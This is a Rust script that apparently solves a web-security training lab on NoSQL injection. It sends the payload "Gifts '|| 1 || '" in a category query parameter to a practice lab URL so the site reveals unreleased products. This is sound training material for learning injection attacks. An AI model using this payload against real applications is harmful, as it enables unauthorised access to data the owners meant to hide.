/**********************************************************************
*
* Lab: Detecting NoSQL injection
*
* Hack Steps: 
*      1. Inject payload into "category" query parameter to retrieve
*         unreleased products
*      2. Observe unreleased products in the response
*
***********************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0aec0083049b138e80fa5d2700e8008e.web-security-academy.net";

fn main() {
    println!("⦗#⦘ Injection parameter: {}", "category".yellow(),);
    print!("❯❯ Injecting payload to retrieve unreleased products.. ",);
    io::stdout().flush().unwrap();

    let payload = "Gifts '|| 1 || '";
    fetch(&format!("/filter?category={payload}"));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn fetch(path: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}